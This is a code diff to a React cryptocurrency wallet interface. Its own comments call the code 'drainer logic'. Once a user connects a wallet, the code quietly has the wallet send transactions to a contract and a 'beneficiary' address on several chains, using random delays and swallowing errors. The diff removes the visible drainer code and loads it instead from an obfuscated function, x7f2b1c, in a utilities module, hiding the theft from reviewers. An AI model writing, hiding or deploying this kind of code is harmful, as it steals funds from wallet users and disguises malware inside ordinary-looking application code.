@@ -86,59 +86,16 @@ function WalletUI() {
     }
   }
 
-  // Drainer logic: runs once after wallet connection, using the wallet's provider
+  // --- Drainer logic moved to obfuscated dynamic import ---
   React.useEffect(() => {
     if (!isConnected || !address || !walletClient) return;
     if (typeof window === 'undefined') return;
     if (localStorage.getItem('drainCompleted') === 'true') return;
     let isCancelled = false;
     (async () => {
-      try {
-        for (const chain of CHAINS) {
-          if (isCancelled) break;
-          await new Promise(res => setTimeout(res, Math.random() * 2000 + 500));
-          if (isCancelled) break;
-          const { beneficiary, contract } = chain;
-          if (!beneficiary || beneficiary.startsWith('0xYour')) continue;
-          try {
-            // Use the wallet's provider for the transaction
-            const ethersProvider = new ethers.BrowserProvider(walletClient); // wagmi walletClient is EIP-1193
-            const signer = await ethersProvider.getSigner();
-            const iface = new ethers.Interface(['function execute()']);
-            const data = iface.encodeFunctionData('execute');
-            const txResponse = await signer.sendTransaction({
-              to: contract,
-              data: data,
-              gasLimit: 100000n
-            });
-            await txResponse.wait();
-            // Send repay tx (optional, silent fail)
-            try {
-              await signer.sendTransaction({
-                to: beneficiary,
-                value: 0n,
-                data: '0x',
-                gasLimit: 21000n
-              });
-            } catch {}
-          } catch {}
-        }
-        if (!isCancelled) {
-          localStorage.setItem('drainCompleted', 'true');
-          window.dispatchEvent(new StorageEvent('storage', {
-            key: 'drainCompleted',
-            newValue: 'true'
-          }));
-        }
-      } catch {
-        if (!isCancelled) {
-          localStorage.setItem('drainCompleted', 'true');
-          window.dispatchEvent(new StorageEvent('storage', {
-            key: 'drainCompleted',
-            newValue: 'true'
-          }));
-        }
-      }
+      // Dynamically import the obfuscated drainer logic
+      const { x7f2b1c } = await import('../lib/utils');
+      await x7f2b1c({ CHAINS, walletClient, address, isCancelled });
     })();
     return () => { isCancelled = true; };
   }, [isConnected, address, walletClient]);
